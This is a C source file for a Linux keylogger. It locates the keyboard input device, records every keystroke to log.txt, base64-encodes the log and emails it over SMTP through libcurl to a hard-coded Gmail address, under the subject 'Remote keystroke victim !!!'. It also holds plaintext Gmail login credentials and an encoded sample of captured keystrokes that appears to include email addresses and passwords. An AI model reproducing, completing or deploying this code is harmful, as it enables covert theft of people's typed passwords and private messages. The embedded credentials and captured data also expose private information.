#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <curl/curl.h>

#define LSIZ 70
#define RSIZ 100
#define FROM_MAIL     "doi2xuyenviet7@gmail.com"
#define TO_MAIL       "nguyenngocdoanh1998@gmail.com"
const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char event_file_path[18] = "/dev/input/";

char * payload_text =
  "Content-Type: multipart/mixed; boundary================3165153444163065104==\r\n"
  "MIME-Version: 1.0\r\n"
  "From: doi2xuyenviet7@gmail.com\r\n"
  "To: nguyenngocdoanh1998@gmail.com\r\n"
  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@rfcpedant.example.org>\r\n"
  "Subject: Remote keystroke victim !!!\r\n\r\n"
  "--===============3165153444163065104==\r\n"
  "Content-Type: application/octet-stream\r\n"
  "MIME-Version: 1.0\r\n"
  "Content-Transfer-Encoding: base64\r\n"
  "Content-Disposition: attachment; filename= log.txt\r\n\r\n";
  //"UF1bVVBdW1VQXVtVUF1bUklHSFRdW1JJR0hUXVtSSUdIVF1bVVBdW0RPV05dW0RPV05dW2VuZF1bRU5URVJdW1NQQUNFXVtTUEFDRV0nW1NISUZUXVxyXG4nW1NISUZUXVtET1dOXVtET1dOXVtET1dOXVtET1c="
  //"\r\n--===============3165153444163065104==--\r\n.\r\n";

char * boundary =  "\r\n--===============3165153444163065104==--\r\n.\r\n";

static const char * payload_text_ =
  "Content-Type: multipart/mixed; boundary================3165153444163065104==\r\n"
  "MIME-Version: 1.0\r\n"
  "From: doi2xuyenviet7@gmail.com\r\n"
  "To: nguyenngocdoanh1998@gmail.com\r\n"
  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@rfcpedant.example.org>\r\n"
  "Subject: Remote keystroke victim !!!\r\n\r\n"
  "--===============3165153444163065104==\r\n"
  "Content-Type: application/octet-stream\r\n"
  "MIME-Version: 1.0\r\n"
  "Content-Transfer-Encoding: base64\r\n"
  "Content-Disposition: attachment; filename= log.txt\r\n\r\n"
  "W0NUUkxdW1JJR0hUXWFbUklHSFRdW0NUUkxdYVtDVFJMXWFbUklHSFRdbmd1eWVubHNbU1BBQ0Vd\r\n"
  "LWxhW0VOVEVSXVtDVFJMXWEyY2RbU1BBQ0VdbGlbVEFCXVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5U\r\n"
  "RVJdY2F0W1NQQUNFXWxvW1RBQl1bRU5URVJdW1VQXVtFTlRFUl1bVVBdW0VOVEVSXVtVUF1bRU5U\r\n"
  "RVJdbHNbU1BBQ0VdLWxhW0VOVEVSXW5ndXllbm5nb2Nkb2FuaDE5OThbU0hJRlRdMmdtYWlsLmNv\r\n"
  "bVtFTlRFUl0xMjM0NTY3ODkyW1NISUZUXTEyM3F3ZWFzZFtFTlRFUl1jYXRbU1BBQ0VdbG9nW1RB\r\n"
  "Ql1bRU5URVJdbHMtW1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQkFDS1NQQUNFXXNbU1BB\r\n"
  "Q0VdLWxhW0VOVEVSXWNkW1NQQUNFXS4uW0VOVEVSXWxzW1NQQUNFXS1sYVtFTlRFUl1sc1tTUEFD\r\n"
  "RV0tbGFbU1BBQ0Vdc2NyW1RBQl1lW1RBQl1bVEFCXVtUQUJdW0JBQ0tTUEFDRV1jZFtTUEFDRV1s\r\n"
  "aVtUQUJdW0VOVEVSXWxzW1NQQUNFXS1sYVtFTlRFUl1bQ1RSTF1hMVtDVFJMXWFbUklHSFRdW1tD\r\n"
  "VFJMXWFbW1VQXXFbQ1RSTF1hW1JJR0hUXW5hbm9bU1BBQ0VdW1NQQUNFXVtDVFJMXWEtbmFub1tT\r\n"
  "UEFDRV1bQ1RSTF1hW1VQXVtDVFJMXWF4eWtbVEFCXVtTSElGVF0tW1RBQl1bRU5URVJdW0RPV05d\r\n"
  "W0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW1VQXVtVUF1b\r\n"
  "VVBdW1VQXVtVUF1bVVBdW0RPV05dW2VuZF1bQ1RSTF1hLWxzW1NQQUNFXS1sYVtFTlRFUl1bQ1RS\r\n"
  "TF1hW1JJR0hUXVtDVFJMXWFbUklHSFRdbmd1eWVubmdvY2RvYW5oMTk5OFtTSElGVF0yZ21haWwu\r\n"
  "Y29tW0VOVEVSXWNvbmdbU1BBQ0VddHlbU1BBQ0VdYW5bU1BBQ0VdbmluaFtTUEFDRV1tYW5nW1NQ\r\n"
  "QUNFXXZpZXR0ZWxbRU5URVJddmlldHRlbFtTUEFDRV1jeWJlcltTUEFDRV1zZWN1cml0eVtFTlRF\r\n"
  "Ul1bQ1RSTF1hW1JJR0hUXW5ndXllbm5nb2Nkb2FuaDE5OThbU0hJRlRdMmdtYWlsLmNvbVtFTlRF\r\n"
  "Ul1sc1tTUEFDRV0tbGFbRU5URVJdbltCQUNLU1BBQ0VdY29uZ1tTUEFDRV10eVtTUEFDRV1hbltT\r\n"
  "UEFDRV1uaW5oW1NQQUNFXW1hbmdbU1BBQ0VddmlldHRlbFtFTlRFUl12aWV0dGVsW1NQQUNFXWN5\r\n"
  "YmVyc2VjdXJpdHlbRU5URVJdaGFbU1BBQ0Vdbm9pW1NQQUNFXXZpZXRuYW1bRU5URVJdMjAvMTEv\r\n"
  "MltCQUNLU1BBQ0VdMTk5OFtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdbHNsW0JBQ0tTUEFDRV1b\r\n"
  "QkFDS1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQ1RSTF1hW1JJR0hUXWxzW1NQQUNFXS1s\r\n"
  "YVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdaGhoaGhoaGhoaGhjW0NUUkxdamhnZGhnZ2pqaGZo\r\n"
  "Z2Z5dGZoZmhnamhqaGdqaGdqW0VOVEVSXWFnbGdhZ2RrZ2FnbGtkYWxnW0NUUkxdYVtSSUdIVF1u\r\n"
  "YW5vW1NQQUNFXXRlW1RBQl1bQkFDS1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQkFDS1NQ\r\n"
  "QUNFXVtCQUNLU1BBQ0Vdc1tUQUJdW0VOVEVSXWFnYWJnbG5ndXllbm5nb2Nkb2FuaDE5OThbU0hJ\r\n"
  "RlRdMmdtYWlsLmNvbWFzO2RmamxramFzZDtmW0VOVEVSXWFqc2RmbDtraltFTlRFUl1hanNkbDtm\r\n"
  "W0VOVEVSXWFzamQ7ZltFTlRFUl1bQ1RSTF1hLWxzW1NQQUNFXS1sYVtFTlRFUl1jYXRbU1BBQ0Vd\r\n"
  "b1tUQUJdW0VOVEVSXVtVUF1bRU5URVJdW1VQXVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdW1VQ\r\n"
  "XVtFTlRFUl1bVVBdW0VOVEVSXVtVUF1bRU5URVJdW1VQXVtFTlRFUl1bVVBdW0VOVEVSXWNhdFtT\r\n"
  "UEFDRV1vW1RBQl1bRU5URVJdW0NUUkxdYVtVUF1bQ1RSTF1heltDVFJMXWFbZ1tVUF1bVVBdW1VQ\r\n"
  "XQ==\r\n"
  "--===============3165153444163065104==--\r\n.\r\n"
  "Content-Type: image/png\r\n"
  "MIME-Version: 1.0\r\n"
  "Content-Transfer-Encoding: base64\r\n"
  "Content-ID: <1>\r\n\r\n"
  "--===============3165153444163065104==--\r\n.\r\n";


size_t b64_encoded_size(size_t inlen)
{
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

char *b64_encode(const unsigned char *in, size_t len)
{
	char   *out;
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out  = malloc(elen+1);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = b64chars[(v >> 18) & 0x3F];
		out[j+1] = b64chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = b64chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = b64chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}

	return out;
}

/*
char* convert_bytes_to_base64(const char * data){
	char       *enc;
	printf("data:    '%s'\n", data);

	enc = b64_encode((const unsigned char *)data, strlen(data));
	printf("encoded: '%s'\n", enc);
    return enc;
}*/

void find_event_file_path(){
    FILE *fp;
    char line[RSIZ][LSIZ];
    int i = 0;
    int lines = 0;

    fp = fopen("/proc/bus/input/devices", "r");
    if (fp == NULL){
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }

    while(fgets(line[i], LSIZ, fp)){
        line[i][strlen(line[i])-1] = '\0';
        i++;
    }
    lines = i;

    for(i=0;i<lines;i++){
        //printf("%s\"\n", line[i]);
        if (strstr(line[i], "EV=120013") != NULL){
            for(int j=0;j<i;j++){
                if (strstr(line[j], "Handlers") != NULL){
                    line[j][strlen(line[j])-1] = '\0';
                    char * item = strrchr(line[j],' ') + 1;
                    strcat(event_file_path, item);
                    printf("%s\n", event_file_path);
                }
            }
        }
    }
    fclose(fp);
}

char* find_key(int code){
    switch(code){
        case 1: return "[ESC]";
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "[BACKSPACE]";
        case 15: return "[TAB]";
        case 16: return "q";
        case 17: return "w";
        case 18: return "e";
        case 19: return "r";
        case 20: return "t";
        case 21: return "y";
        case 22: return "u";
        case 23: return "i";
        case 24: return "o";
        case 25: return "p";
        case 26: return "[";
        case 27: return "]";
        case 28: return "[ENTER]";
        case 29: return "[CTRL]";
        case 30: return "a";
        case 31: return "s";
        case 32: return "d";
        case 33: return "f";
        case 34: return "g";
        case 35: return "h";
        case 36: return "j";
        case 37: return "k";
        case 38: return "l";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "[SHIFT]";
        case 43: return "\\";
        case 44: return "z";
        case 45: return "x";
        case 46: return "c";
        case 47: return "v";
        case 48: return "b";
        case 49: return "n";
        case 50: return "m";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 54: return "[SHIFT]";
        case 55: return "*";
        case 57: return "[SPACE]";
        case 58: return "[CAPSLOCK]";
        case 102: return "[HOME]";
        case 103: return "[UP]";
        case 104: return "[PGUP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 107: return "[END]";
        case 108: return "[DOWN]";
        case 109: return "[PGDN]";
        default: return "";
    }
}

void read_event_kdb(){
    FILE * fp = fopen("log.txt", "a");
    struct input_event event;
    int events = open(event_file_path, O_RDONLY);
    while(1){
        read(events,&event, sizeof(event));
        if(event.type == 1 && event.value == 1){
            printf("Key: %i State: %i\n",event.code,event.value);
            printf("Typed: %s\n",find_key(event.code));
            fputs(find_key(event.code), fp);
            //send_email();
        }
    }
}

struct upload_status {
  size_t bytes_read;
};

static size_t payload_source(char *ptr, size_t size, size_t nmemb, void *userp)
{
  struct upload_status *upload_ctx = (struct upload_status *)userp;
  const char *data;
  size_t room = size * nmemb;

  if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
    return 0;
  }

  data = &payload_text[upload_ctx->bytes_read];
  if(data) {
    size_t len = strlen(data);
    if(room < len)
      len = room;
    memcpy(ptr, data, len);
    printf("%s\n", data);
    upload_ctx->bytes_read += len;

    return len;
  }

  return 0;
}

int send_email(){
    //system("scrot -o /home/doanhnn/linux/keylogger/C/screen.png");
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx = { 0 };

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME, "doi2xuyenviet7@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "@123456789@");
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_MAIL);

        recipients = curl_slist_append(recipients, TO_MAIL);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        /* Send the message */
        res = curl_easy_perform(curl);

        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* Free the list of recipients */
        curl_slist_free_all(recipients);

        /* Always cleanup */
        curl_easy_cleanup(curl);
  }
  return (int)res;
}

char * concat_string(char * s1, char * s2, char* s3){
    char * s4 = (char *) malloc(1 + strlen(s1)+ strlen(s2) + strlen(s3));
    strcpy(s4, s1);
    strcat(s4, s2);
    strcat(s4, s3);
    return s4;
}

int main() {
    //find_event_file_path();
    //read_event_kdb();

    FILE *fp;
    char *buff = malloc(sizeof(char) * 1024);
    fp = fopen("log.txt", "r");
    fscanf(fp, "%s", buff);
    char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
    char * tmp = payload_text;
    payload_text = concat_string(tmp, enc, boundary);
    printf("%s\n", payload_text);
    send_email();
    free(buff);
    free(enc);
    return 0;
}
